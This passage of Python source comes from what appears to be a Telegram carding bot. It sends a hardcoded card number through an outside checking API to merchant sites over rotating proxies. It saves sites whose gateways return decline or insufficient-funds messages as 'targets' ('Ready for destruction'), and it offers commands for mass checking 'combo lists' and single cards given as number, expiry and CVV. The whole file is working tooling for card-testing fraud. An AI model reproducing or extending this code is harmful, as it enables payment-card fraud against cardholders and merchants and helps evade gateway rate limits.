        f"🌐 **SITE VALIDATION** : LIVE {spin}\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"📶 **Progress**: `[{bar}]` {percent}%\n\n"
        "📊 **STATS**\n"
        f"✅ Live: `{live}`\n"
        f"❌ Dead: `{dead}`\n"
        f"🔢 Checked: `{done}/{total}`\n\n"
        "🧪 **CURRENT SITE**\n"
        f"🌍 `{current[:60]}`...\n"
        f"💬 `{response}`\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )

def stop_button():
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("⛔ STOP VALIDATION ⛔", callback_data="stop_validation"))
    return kb

@bot.message_handler(commands=['seturl'])
@user_only
def set_url(message):
    if message.reply_to_message:
        raw = extract_content_from_message(message)
        if raw:
            start_validation(message, raw)
        return

    if len(message.text.split()) > 1:
        raw = message.text.split(maxsplit=1)[1].splitlines()
        start_validation(message, raw)
        return

    # Animated Prompt
    prompt_frames = [
        "📥 **SEND SITES LIST**\nUpload or paste sites to validate.",
        "📥 **SEND SITES LIST**\nUpload or paste sites to validate...\n(𝐀𝐧𝐢𝐦𝐚𝐭𝐢𝐧𝐠...)",
    ]
    msg = bot.send_message(message.chat.id, prompt_frames[0], parse_mode="Markdown")
    play_anim(message.chat.id, msg.message_id, prompt_frames, delay=1.0)
    bot.register_next_step_handler(msg, lambda m: start_validation(m, extract_content_from_message(m)))

def start_validation(message, raw_lines):
    if not raw_lines:
        bot.reply_to(message, "❌ No sites found in message.")
        return

    proxies = load_data(PROXIES_FILE)
    proxy = proxies[0] if proxies else None

    if proxy:
        result, details = check_proxy_rotation(proxy)
        if result == "ROTATING":
            bot.send_message(message.chat.id, f"✅ Proxy Valid: {details} — Using proxy for validation.")
        elif result == "STATIC":
            bot.send_message(message.chat.id, f"⚠️ Proxy Static: {details} — Proceeding without proxy.")
            proxy = None
        else:
            bot.send_message(message.chat.id, f"❌ Proxy Dead: {details} — Proceeding without proxy.")
            proxy = None
    else:
        bot.send_message(message.chat.id, "⚠️ No proxy configured — validating without proxy.")

    potential = extract_clean_urls(raw_lines)
    if not potential:
        bot.reply_to(message, "❌ No valid URLs found.")
        return

    chat_id = message.chat.id
    total = len(potential)

    state = {
        "total": total, "done": 0, "live": 0, "dead": 0,
        "valid_sites": [], "current": "Starting...", "response": "Initializing",
        "stop": False, "proxy": proxy
    }
    active_validation[chat_id] = state

    tick = 0
    status_msg = bot.reply_to(message, build_validation_ui(state, tick), parse_mode="Markdown", reply_markup=stop_button())

    def ui_updater():
        global tick
        while not state["stop"] and state["done"] < total:
            tick += 1
            try:
                bot.edit_message_text(build_validation_ui(state, tick), chat_id, status_msg.message_id,
                                      parse_mode="Markdown", reply_markup=stop_button())
            except: pass
            time.sleep(2)

    threading.Thread(target=ui_updater, daemon=True).start()

    def validate(url):
        if state["stop"]:
            return
        state["current"] = url
        state["response"] = "Testing..."

        try:
            api_req = f"{API_URL}?cc=5196032154986133|07|27|000&url={urllib.parse.quote(url)}"
            if state["proxy"]:
                api_req += f"&proxy={urllib.parse.quote(state['proxy'])}"

            sess = get_session()
            r = sess.get(api_req, timeout=20)

            # DEBUG: Console mein raw response dikhao
            print("\n" + "="*80)
            print(f"SITE: {url}")
            print(f"STATUS CODE: {r.status_code}")
            print(f"RAW RESPONSE:\n{r.text.strip()}")
            print("="*80 + "\n")

            text = r.text.lower()

            # Strong Check: CAPTCHA = DEAD (sabse pehle check)
            if "captcha" in text:
                state["dead"] += 1
                state["response"] = "DEAD (CAPTCHA) ❌"
                return

            # Site Dead Check
            if "site dead" in text:
                state["dead"] += 1
                state["response"] = "DEAD (OFFLINE) ❌"
                return

            try:
                json_data = r.json()
                clean_msg = json_data.get("Response", "") or json_data.get("message", r.text)
            except:
                clean_msg = r.text[:100]

            msg_lower = clean_msg.lower()

            # Real Live Keywords (Captcha bilkul nahi hai)
            live_keywords = [
                "card_declined", "declined", "invalid card", "incorrect_cvc", "incorrect cvc",
                "generic error", "generic_error", "payment failed", "transaction declined",
                "insufficient_funds", "insufficient funds", "do not honor", "gateway rejected",
                "3ds", "3d secure", "suspicious activity",
                "blocked", "blocked for fraud", "risky transaction", "security check failed",
                "avs mismatch", "cvv mismatch", "expired card", "insufficient balance"
            ]

            if any(kw in msg_lower for kw in live_keywords):
                state["live"] += 1
                state["valid_sites"].append(url)
                state["response"] = "LIVE ✅"
            else:
                state["dead"] += 1
                state["response"] = "DEAD ❌"

        except Exception as e:
            print(f"ERROR on {url}: {e}")
            state["dead"] += 1
            state["response"] = "ERROR ⚠️"

        finally:
            state["done"] += 1

    # Correct placement — outside validate function
    with ThreadPoolExecutor(max_workers=VALIDATION_WORKERS) as executor:
        executor.map(validate, potential)

    current_db = load_data(SITES_FILE)
    current_db.extend(state["valid_sites"])
    current_db = list(set(current_db))
    save_data(SITES_FILE, current_db)

    # Animated Final UI
    final_frames = [
        "🎯 **TARGET ACQUISITION COMPLETE**\n━━━━━━━━━━━━━━━━━━━━\n✅ Live Saved: `{live}`\n❌ Dead: `{dead}`\n💾 Total DB: `{total}`\n...",
        "🎯 **TARGET ACQUISITION COMPLETE**\n━━━━━━━━━━━━━━━━━━━━\n✅ Live Saved: `{live}`\n❌ Dead: `{dead}`\n💾 Total DB: `{total}`\n━━━━━━━━━━━━━━━━━━━━\n🟢 Ready for destruction",
    ].format(live=len(state['valid_sites']), dead=state['dead'], total=len(current_db))
    final_frames = [frame.format(live=len(state['valid_sites']), dead=state['dead'], total=len(current_db)) for frame in final_frames]
    try:
        bot.edit_message_text(final_frames[0], chat_id, status_msg.message_id, parse_mode="Markdown")
        play_anim(chat_id, status_msg.message_id, final_frames, delay=0.8)
    except:
        bot.send_message(chat_id, final_frames[-1], parse_mode="Markdown")

    active_validation.pop(chat_id, None)

@bot.callback_query_handler(func=lambda call: call.data == "stop_validation")
def stop_validation(call):
    chat_id = call.message.chat.id
    if chat_id in active_validation:
        active_validation[chat_id]["stop"] = True
        bot.answer_callback_query(call.id, "⛔ Validation Stopped")
        bot.edit_message_text(
            "⛔ **VALIDATION STOPPED BY USER**\n━━━━━━━━━━━━━━━━━━━━\nProcess terminated manually.",
            chat_id,
            call.message.message_id,
            parse_mode="Markdown"
        )

# ================= RECHECK COMMAND (ENHANCED ANIMATED) =================
@bot.message_handler(commands=['resites'])
@user_only
def resites_check(message):
    # 1. Database Check
    sites = load_data(SITES_FILE)
    if not sites:
        bot.reply_to(message, "⚠️ 𝐀𝐔𝐃𝐈𝐓 𝐅𝐀𝐈𝐋𝐄𝐃: 𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞 𝐄𝐦𝐩𝐭𝐲.")
        return

    # 2. Proxy Check
    proxies = load_data(PROXIES_FILE)
    if not proxies:
        bot.reply_to(message, "💎 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐆𝐀𝐓𝐄𝐖𝐀𝐘 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃\n🛑 No Proxy Found.")
        return

    proxy = proxies[0]
    
    # 3. Proxy Verification with Animation
    check_frames = [
        "🔄 **𝐕𝐞𝐫𝐢𝐟𝐲𝐢𝐧𝐠 𝐒𝐞𝐜𝐮𝐫𝐞 𝐍𝐨𝐝𝐞...**\n📡 Connecting to Proxy...",
        "🔄 **𝐕𝐞𝐫𝐢𝐟𝐲𝐢𝐧𝐠 𝐒𝐞𝐜𝐮𝐫𝐞 𝐍𝐨𝐝𝐞...**\n📡 Connecting to Proxy... ✅\n🔍 Testing Rotation...",
        "🔄 **𝐕𝐞𝐫𝐢𝐟𝐲𝐢𝐧𝐠 𝐒𝐞𝐜𝐮𝐫𝐞 𝐍𝐨𝐝𝐞...**\n📡 Connecting to Proxy... ✅\n🔍 Testing Rotation... ✅\n🟢 Ready!",
    ]
    check_msg = bot.send_message(message.chat.id, check_frames[0], parse_mode="Markdown")
    play_anim(message.chat.id, check_msg.message_id, check_frames, delay=1.0)
    
    status, details = check_proxy_rotation(proxy)
    
    if status == "DEAD":
        dead_frames = [
            "❌ **𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐈𝐎𝐍 𝐋𝐎𝐒𝐓**\nProxy Dead.",
            "❌ **𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐈𝐎𝐍 𝐋𝐎𝐒𝐓**\nProxy Dead.\nUpdate Proxy and Try Again.",
        ]
        play_anim(message.chat.id, check_msg.message_id, dead_frames, delay=0.5)
        return

    try:
        bot.delete_message(message.chat.id, check_msg.message_id)
    except: pass

    # 4. Setup State
    chat_id = message.chat.id
    total = len(sites)
    active_recheck[chat_id] = True

    state = {
        "total": total, "done": 0, "live": 0, "dead": 0,
        "current": "Starting Engine...", "proxy": "ACTIVE"
    }

    stop_kb = types.InlineKeyboardMarkup()
    stop_kb.add(types.InlineKeyboardButton("⛔ 𝐓𝐄𝐑𝐌𝐈𝐍𝐀𝐓𝐄 𝐀𝐔𝐃𝐈𝐓 ⛔", callback_data="stop_resites"))

    # Initial Message (Tick 0)
    tick = 0
    status_msg = bot.send_message(chat_id, build_nuclear_ui(state, tick), parse_mode="Markdown", reply_markup=stop_kb)

    # UI Updater (Animation Loop)
    def ui_updater():
        global tick
        while state["done"] < total and active_recheck.get(chat_id):
            tick += 1 # Har loop me tick badhega, jisse animation chalegi
            try:
                # Tick pass kiya function ko
                bot.edit_message_text(build_nuclear_ui(state, tick), chat_id, status_msg.message_id, parse_mode="Markdown", reply_markup=stop_kb)
            except: pass
            time.sleep(2) # 2 Second delay for smooth animation

    threading.Thread(target=ui_updater, daemon=True).start()

    # 5. Worker Logic
    def check_site_worker(site):
        if not active_recheck.get(chat_id): return
        state["current"] = site
        if verify_site(site, proxy):
            state["live"] += 1
        else:
            state["dead"] += 1
            remove_dead_site(site)
        state["done"] += 1

    # 6. Main Runner
    def runner():
        start_time = time.time()
        with ThreadPoolExecutor(max_workers=4) as executor:
            executor.map(check_site_worker, list(sites))

        active_recheck.pop(chat_id, None)
        duration = round(time.time() - start_time, 1)
        
        # Animated Final Report
        final_frames = [
            "💎 **𝐀𝐔𝐃𝐈𝐓 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃**\n━━━━━━━━━━━━━━━━━━━━━\n📊 𝐅𝐈𝐍𝐀𝐋 𝐒𝐔𝐌𝐌𝐀𝐑𝐘:\n⏱️ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧   : {duration}𝐬\n...",
            "💎 **𝐀𝐔𝐃𝐈𝐓 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃**\n━━━━━━━━━━━━━━━━━━━━━\n📊 𝐅𝐈𝐍𝐀𝐋 𝐒𝐔𝐌𝐌𝐀𝐑𝐘:\n⏱️ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧   : {duration}𝐬\n📂 𝐓𝐨𝐭𝐚𝐥 𝐒𝐢𝐭𝐞𝐬 : `{total}`\n...",
            "💎 **𝐀𝐔𝐃𝐈𝐓 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃**\n━━━━━━━━━━━━━━━━━━━━━\n📊 𝐅𝐈𝐍𝐀𝐋 𝐒𝐔𝐌𝐌𝐀𝐑𝐘:\n⏱️ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧   : {duration}𝐬\n📂 𝐓𝐨𝐭𝐚𝐥 𝐒𝐢𝐭𝐞𝐬 : `{total}`\n━━━━━━━━━━━━━━━━━━━━━\n✅ 𝐕𝐞𝐫𝐢𝐟𝐢𝐞𝐝    : `{live}`\n❌ 𝐑𝐞𝐦𝐨𝐯𝐞𝐝     : `{dead}`\n...",
            "💎 **𝐀𝐔𝐃𝐈𝐓 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃**\n━━━━━━━━━━━━━━━━━━━━━\n📊 𝐅𝐈𝐍𝐀𝐋 𝐒𝐔𝐌𝐌𝐀𝐑𝐘:\n⏱️ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧   : {duration}𝐬\n📂 𝐓𝐨𝐭𝐚𝐥 𝐒𝐢𝐭𝐞𝐬 : `{total}`\n━━━━━━━━━━━━━━━━━━━━━\n✅ 𝐕𝐞𝐫𝐢𝐟𝐢𝐞𝐝    : `{live}`\n❌ 𝐑𝐞𝐦𝐨𝐯𝐞𝐝     : `{dead}`\n━━━━━━━━━━━━━━━━━━━━━\n💾 𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐨𝐩𝐭𝐢𝐦𝐢𝐳𝐞𝐝."
        ].format(duration=duration, total=total, live=state['live'], dead=state['dead'])
        final_frames = [frame.format(duration=duration, total=total, live=state['live'], dead=state['dead']) for frame in final_frames]
        
        try:
            bot.edit_message_text(final_frames[0], chat_id, status_msg.message_id, parse_mode="Markdown")
            play_anim(chat_id, status_msg.message_id, final_frames, delay=0.8)
        except:
            bot.send_message(chat_id, final_frames[-1], parse_mode="Markdown")

    threading.Thread(target=runner).start()

# Stop Handler wahi same rahega
@bot.callback_query_handler(func=lambda call: call.data == "stop_resites")
def stop_resites_handler(call):
    chat_id = call.message.chat.id
    if chat_id in active_recheck:
        active_recheck[chat_id] = False
        bot.answer_callback_query(call.id, "🛑 Stopping...")
        bot.send_message(chat_id, "⛔ **AUDIT TERMINATED BY USER.**")

# ================= UI BUILDER (ENHANCED ANIMATED DIAMOND THEME) =================
def build_nuclear_ui(state, tick):
    total = state["total"]
    done = state["done"]
    live = state["live"]
    dead = state["dead"]
    current = state.get("current", "Initializing...")[:30]

    # --- ENHANCED ANIMATION FRAMES ---
    # 1. Spinner (Gol Ghumne wala)
    spinners = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    spin_icon = spinners[tick % len(spinners)]

    # 2. Pulse Effect (Blinking Diamond)
    pulses = ["💠", "🔷", "🔹", "▫️"]
    pulse_icon = pulses[tick % len(pulses)]

    # 3. Scanning Bar (Niche chalta hua)
    scanners = ["▰▱▱▱▱", "▱▰▱▱▱", "▱▱▰▱▱", "▱▱▱▰▱", "▱▱▱▱▰"]
    scan_bar = scanners[tick % len(scanners)]

    # Progress Bar Calculation
    if total > 0:
        percent = int((done / total) * 100)
        prog = int((done / total) * 10)
        bar = "█" * prog + "░" * (10 - prog)
    else:
        percent = 0
        bar = "░" * 10

    return (
        f"{pulse_icon} 𝐋𝐈𝐕𝐄 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄 𝐀𝐔𝐃𝐈𝐓 {spin_icon}\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ 𝐒𝐩𝐞𝐞𝐝: 𝟒𝐱 (𝐏𝐚𝐫𝐚𝐥𝐥𝐞𝐥 𝐌𝐨𝐝𝐞)\n"
        f"🔄 𝐏𝐫𝐨𝐜𝐞𝐬𝐬𝐞𝐝: `{done}/{total}`\n"
        f"📶 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬:  `[{bar}]` {percent}%\n\n"
        "📊 𝐑𝐄𝐀𝐋-𝐓𝐈𝐌𝐄 𝐌𝐄𝐓𝐑𝐈𝐂𝐒\n"
        f"🟢 𝐀𝐜𝐭𝐢𝐯𝐞 𝐆𝐚𝐭𝐞𝐬 : `{live}`\n"
        f"🔴 𝐃𝐞𝐚𝐝 𝐋𝐢𝐧𝐤𝐬   : `{dead}`\n"
        f"🗑️ 𝐀𝐜𝐭𝐢𝐨𝐧       : 𝐀𝐮𝐭𝐨-𝐃𝐞𝐥𝐞𝐭𝐞\n\n"
        "📍 𝐂𝐮𝐫𝐫𝐞𝐧𝐭𝐥𝐲 𝐒𝐜𝐚𝐧𝐧𝐢𝐧𝐠:\n"
        f"🔗 `{current}`...\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"🚀 𝐍𝐄𝐗𝐔𝐒 𝐄𝐧𝐠𝐢𝐧𝐞: {scan_bar} 𝐖𝐨𝐫𝐤𝐢𝐧𝐠"
    )

# ================= OTHER COMMANDS (ANIMATED) =================
@bot.message_handler(commands=['txtls'])
@user_only
def ls(m):
    s = load_data(SITES_FILE)
    if not s: 
        # Animated Empty DB
        empty_frames = [
            "☢️ **𝐂𝐑𝐈𝐓𝐈𝐂𝐀𝐋 𝐄𝐑𝐑𝐎𝐑** ☢️\n❌ DB Empty",
            "☢️ **𝐂𝐑𝐈𝐓𝐈𝐂𝐀𝐋 𝐄𝐑𝐑𝐎𝐑** ☢️\n❌ DB Empty\n🔧 Use /seturl to load targets.",
        ]
        empty_msg = bot.send_message(m.chat.id, empty_frames[0], parse_mode="Markdown")
        play_anim(m.chat.id, empty_msg.message_id, empty_frames, delay=0.5)
        return

    total = len(s)   
    display = "\n".join([f"➣ {i}" for i in s[:15]])   
    text = f"📂 **GATEWAY DATABASE VIEWER**\n━━━━━━━━━━━━━━━━━━━━━━━━\n💎 **Targets Locked:** `{total}`\n━━━━━━━━━━━━━━━━━━━━━━━━\n{display}\n\n...and {max(0, total-15)} more"   
      
    if total > 50:   
        with open("Sites_DB.txt", "w") as f: f.write("\n".join(s))   
        with open("Sites_DB.txt", "rb") as f: bot.send_document(m.chat.id, f, caption=text, parse_mode="Markdown")   
        os.remove("Sites_DB.txt")   
    else:   
        # Animated List Display
        list_frames = [
            f"📂 **GATEWAY DATABASE VIEWER**\n━━━━━━━━━━━━━━━━━━━━━━━━\n💎 **Targets Locked:** `{total}`\n...",
            text,
        ]
        list_msg = bot.send_message(m.chat.id, list_frames[0], parse_mode="Markdown")
        play_anim(m.chat.id, list_msg.message_id, list_frames, delay=0.8)
        
@bot.message_handler(commands=['txtrm'])
@user_only
def txtrm_command(message):
    sites = load_data(SITES_FILE)
    if not sites:
        # Animated Empty
        empty_frames = [
            "⚠️ **DATABASE ALREADY EMPTY**\n━━━━━━━━━━━━━━━━━━━━━━━━\nNo sites to remove.",
            "⚠️ **DATABASE ALREADY EMPTY**\n━━━━━━━━━━━━━━━━━━━━━━━━\nNo sites to remove.\nReady for new targets!",
        ]
        empty_msg = bot.send_message(message.chat.id, empty_frames[0], parse_mode="Markdown")
        play_anim(message.chat.id, empty_msg.message_id, empty_frames, delay=0.5)
        return

    text = message.text.strip()  
    args = text.split(maxsplit=1)[1] if len(text.split()) > 1 else ""  
    
    if not args:  
        # Animated Usage
        usage_frames = [
            "⚠️ **USAGE**\n━━━━━━━━━━━━━━━━━━━━━━━━\n`/txtrm all` → Remove All Sites\n...",
            "⚠️ **USAGE**\n━━━━━━━━━━━━━━━━━━━━━━━━\n`/txtrm all` → Remove All Sites\n`/txtrm <url>` → Remove Specific Site\n\nExample:\n`/txtrm https://example.com`",
        ]
        usage_msg = bot.send_message(message.chat.id, usage_frames[0], parse_mode="Markdown")
        play_anim(message.chat.id, usage_msg.message_id, usage_frames, delay=0.6)
        return  

    if args.lower() == "all":  
        save_data(SITES_FILE, [])  
        # Animated Purge Complete
        purge_frames = [
            "🗑️ **SYSTEM PURGE COMPLETED**\n━━━━━━━━━━━━━━━━━━━━━━━━\n🗑️ Removed: `{sites}` sites\n...",
            "🗑️ **SYSTEM PURGE COMPLETED**\n━━━━━━━━━━━━━━━━━━━━━━━━\n🗑️ Removed: `{sites}` sites\n✅ Database fully cleared.\n━━━━━━━━━━━━━━━━━━━━━━━━\n🔥 Ready for fresh targets.",
        ].format(sites=len(sites))
        purge_frames = [frame.format(sites=len(sites)) for frame in purge_frames]
        purge_msg = bot.send_message(message.chat.id, purge_frames[0], parse_mode="Markdown")
        play_anim(message.chat.id, purge_msg.message_id, purge_frames, delay=0.7)
        return  

    url_to_remove = args.strip().lower()  
    if url_to_remove.endswith('/'): 
        url_to_remove = url_to_remove[:-1]  
    
    removed = False  
    updated_sites = []  
    
    for site in sites:  
        normalized_site = site.lower()  
        if normalized_site.endswith('/'): 
            normalized_site = normalized_site[:-1]  
        
        if normalized_site == url_to_remove:  
            removed = True  
        else:  
            updated_sites.append(site)  
            
    if removed:  
        save_data(SITES_FILE, updated_sites)  
        # Animated Success
        success_frames = [
            "🗑️ **SITE REMOVED SUCCESSFULLY**\n━━━━━━━━━━━━━━━━━━━━━━━━\n❌ Deleted: `{url}`\n...",
            "🗑️ **SITE REMOVED SUCCESSFULLY**\n━━━━━━━━━━━━━━━━━━━━━━━━\n❌ Deleted: `{url}`\n📊 Remaining: `{remaining}` sites\n...",
            "🗑️ **SITE REMOVED SUCCESSFULLY**\n━━━━━━━━━━━━━━━━━━━━━━━━\n❌ Deleted: `{url}`\n📊 Remaining: `{remaining}` sites\n━━━━━━━━━━━━━━━━━━━━━━━━\n✅ Database updated.",
        ].format(url=args.strip(), remaining=len(updated_sites))
        success_frames = [frame.format(url=args.strip(), remaining=len(updated_sites)) for frame in success_frames]
        success_msg = bot.send_message(message.chat.id, success_frames[0], parse_mode="Markdown")
        play_anim(message.chat.id, success_msg.message_id, success_frames, delay=0.5)
    else:  
        # Animated Not Found
        not_found_frames = [
            "⚠️ **SITE NOT FOUND**\n━━━━━━━━━━━━━━━━━━━━━━━━\n🔍 Searched for: `{url}`\n...",
            "⚠️ **SITE NOT FOUND**\n━━━━━━━━━━━━━━━━━━━━━━━━\n🔍 Searched for: `{url}`\n❌ This site is not in the database.\n...",
            "⚠️ **SITE NOT FOUND**\n━━━━━━━━━━━━━━━━━━━━━━━━\n🔍 Searched for: `{url}`\n❌ This site is not in the database.\n━━━━━━━━━━━━━━━━━━━━━━━━\nUse `/txtls` to view current targets.",
        ].format(url=args.strip())
        not_found_frames = [frame.format(url=args.strip()) for frame in not_found_frames]
        not_found_msg = bot.send_message(message.chat.id, not_found_frames[0], parse_mode="Markdown")
        play_anim(message.chat.id, not_found_msg.message_id, not_found_frames, delay=0.5)

# ================= SUPPORT COMMAND (ANIMATED) =================
@bot.message_handler(commands=['support'])
@user_only
def support_command(message):
    # Random Session ID
    session_id = f"NEO-{random.randint(100, 999)}"
    
    # Premium Buttons
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("👑 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 👑", url=f"https://t.me/{OWNER_USERNAME.replace('@', '')}")
    btn2 = types.InlineKeyboardButton("💠 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 💠", url=CHANNEL_LINK)
    markup.add(btn1, btn2)

    # Animated Support UI
    support_frames = [
        "💠 **𝐍𝐄𝐎𝐍 𝐒𝐔𝐏𝐏𝐎𝐑𝐓 𝐯𝟒.𝟎**\n╭── [ 🆔 𝐒𝐄𝐒𝐒𝐈𝐎𝐍: `#{session_id}` ] ──\n│ 👤 𝐔𝐒𝐄𝐑      : {name}\n│ 👑 𝐇𝐎𝐒𝐓      : {owner}\n│ 🟢 𝐒𝐓𝐀𝐓𝐔𝐒    : 𝐎𝐍𝐋𝐈𝐍𝐄 (𝐀𝐜𝐭𝐢𝐯𝐞)\n╰────────────────────────────\n⬡ 𝐒𝐘𝐒𝐓𝐄𝐌 𝐃𝐈𝐀𝐆𝐍𝐎𝐒𝐓𝐈𝐂𝐒\n  ├─ 📡 𝐋𝐚𝐭𝐞𝐧𝐜𝐲  : 𝟐𝟒𝐦𝐬 (𝐒𝐭𝐚𝐛𝐥𝐞)\n  ├─ ⏱️ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 : < 𝟏𝟎 𝐌𝐢𝐧𝐬\n  ├─ 🛡️ 𝐌𝐨𝐝𝐞     : 𝐄𝐧𝐜𝐫𝐲𝐩𝐭𝐞𝐝 𝐂𝐡𝐚𝐭\n  └─ 💎 𝐏𝐫𝐢𝐨𝐫𝐢𝐭𝐲 : 𝐔𝐥𝐭𝐫𝐚 𝐇𝐢𝐠𝐡\n\n⚡ 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 𝐀𝐂𝐓𝐈𝐎𝐍𝐒:\n  ► 💎 𝐁𝐮𝐲 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐀𝐜𝐜𝐞𝐬𝐬\n  ► 🐛 𝐑𝐞𝐩𝐨𝐫𝐭 𝐁𝐮𝐠𝐬/𝐄𝐫𝐫𝐨𝐫𝐬\n  ► 🤝 𝐏𝐚𝐫𝐭𝐧𝐞𝐫𝐬𝐡𝐢𝐩 𝐑𝐞𝐩𝐮𝐞𝐬𝐭\n\n⚠️ 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐧𝐠 𝐭𝐨 𝐍𝐞𝐮𝐫𝐚𝐥 𝐋𝐢𝐧𝐤...".format(name=safe_md(message.from_user.first_name), owner=safe_md(OWNER_USERNAME)),
        "💠 **𝐍𝐄𝐎𝐍 𝐒𝐔𝐏𝐏𝐎𝐑𝐓 𝐯𝟒.𝟎**\n╭── [ 🆔 𝐒𝐄𝐒𝐒𝐈𝐎𝐍: `#{session_id}` ] ──\n│ 👤 𝐔𝐒𝐄𝐑      : {name}\n│ 👑 𝐇𝐎𝐒𝐓      : {owner}\n│ 🟢 𝐒𝐓𝐀𝐓𝐔𝐒    : 𝐎𝐍𝐋𝐈𝐍𝐄 (𝐀𝐜𝐭𝐢𝐯𝐞)\n╰────────────────────────────\n⬡ 𝐒𝐘𝐒𝐓𝐄𝐌 𝐃𝐈𝐀𝐆𝐍𝐎𝐒𝐓𝐈𝐂𝐒\n  ├─ 📡 𝐋𝐚𝐭𝐞𝐧𝐜𝐲  : 𝟐𝟒𝐦𝐬 (𝐒𝐭𝐚𝐛𝐥𝐞)\n  ├─ ⏱️ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 : < 𝟏𝟎 𝐌𝐢𝐧𝐬\n  ├─ 🛡️ 𝐌𝐨𝐝𝐞     : 𝐄𝐧𝐜𝐫𝐲𝐩𝐭𝐞𝐝 𝐂𝐡𝐚𝐭\n  └─ 💎 𝐏𝐫𝐢𝐨𝐫𝐢𝐭𝐲 : 𝐔𝐥𝐭𝐫𝐚 𝐇𝐢𝐠𝐡\n\n⚡ 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 𝐀𝐂𝐓𝐈𝐎𝐍𝐒:\n  ► 💎 𝐁𝐮𝐲 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐀𝐜𝐜𝐞𝐬𝐬\n  ► 🐛 𝐑𝐞𝐩𝐨𝐫𝐭 𝐁𝐮𝐠𝐬/𝐄𝐫𝐫𝐨𝐫𝐬\n  ► 🤝 𝐏𝐚𝐫𝐭𝐧𝐞𝐫𝐬𝐡𝐢𝐩 𝐑𝐞𝐩𝐮𝐞𝐬𝐭\n\n⚠️ 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐧𝐠 𝐭𝐨 𝐍𝐞𝐮𝐫𝐚𝐥 𝐋𝐢𝐧𝐤... ✅".format(name=safe_md(message.from_user.first_name), owner=safe_md(OWNER_USERNAME)),
    ]
    support_msg = bot.send_message(message.chat.id, support_frames[0], parse_mode="Markdown", reply_markup=markup)
    play_anim(message.chat.id, support_msg.message_id, support_frames, delay=1.2)

# ================= CHECKING COMMANDS (ANIMATED STATUS) =================
@bot.message_handler(commands=['mtxt'])
@user_only
def mass_check(message):
    if not load_data(PROXIES_FILE):
        return bot.reply_to(message, "⚠️ 𝐍𝐄𝐓𝐖𝐎𝐑𝐊 𝐄𝐑𝐑𝐎𝐑 ⚠️\n━━━━━━━━━━━━━━━━━━━━━━━━\n🔌 Status: 𝐃𝐢𝐬𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝\n🚫 Route: 𝐍𝐨 𝐏𝐫𝐨𝐱𝐲 𝐅𝐨𝐮𝐧𝐝\n\nPlease set up a rotation proxy first.")

    sites = load_data(SITES_FILE)   
    proxies = load_data(PROXIES_FILE)   
    if not sites: 
        return bot.reply_to(message, "☢️ 𝐂𝐑𝐈𝐓𝐈𝐂𝐀𝐋 𝐄𝐑𝐑𝐎𝐑 ☢️\n❌ Database Empty\n🔧 Use /seturl")   
  
    if message.reply_to_message:   
        raw = extract_content_from_message(message)   
        if raw: 
            start_engine(message, "mass_cc", sites, proxies[0], raw)   
        return   
      
    # Animated God-Mode Activation
    god_frames = [
        "⚡ **GOD-MODE ACTIVATED** ⚡\n📥 **Upload Combo List**",
        "⚡ **GOD-MODE ACTIVATED** ⚡\n📥 **Upload Combo List**\n🔥 Engines Warming Up...",
        "⚡ **GOD-MODE ACTIVATED** ⚡\n📥 **Upload Combo List**\n🔥 Engines Ready — Upload Now!",
    ]
    god_msg = bot.send_message(message.chat.id, god_frames[0], parse_mode="Markdown")
    play_anim(message.chat.id, god_msg.message_id, god_frames, delay=0.8)
    bot.register_next_step_handler(god_msg, lambda m: start_engine(m, "mass_cc", sites, proxies[0], extract_content_from_message(m)))

@bot.message_handler(commands=['chk'])
@user_only
def quick_chk(message):
    if not load_data(PROXIES_FILE):
        return bot.reply_to(message, "⚠️ 𝐍𝐄𝐓𝐖𝐎𝐑𝐊 𝐄𝐑𝐑𝐎𝐑 ⚠️\n━━━━━━━━━━━━━━━━━━━━━━━━\n🔌 Status: 𝐃𝐢𝐬𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝\n🚫 Route: 𝐍𝐨 𝐏𝐫𝐨𝐱𝐲 𝐅𝐨𝐮𝐧𝐝\n\nPlease set up a rotation proxy first.")

    try: 
        cc_data = message.text.split()[1]   
    except: 
        # Animated Usage
        usage_frames = [
            "⚠️ **Usage:** `/chk cc|mm|yy|cvv`",
            "⚠️ **Usage:** `/chk cc|mm|yy|cvv`\nExample: `/chk 5196032154986133|07|27|000`",
        ]
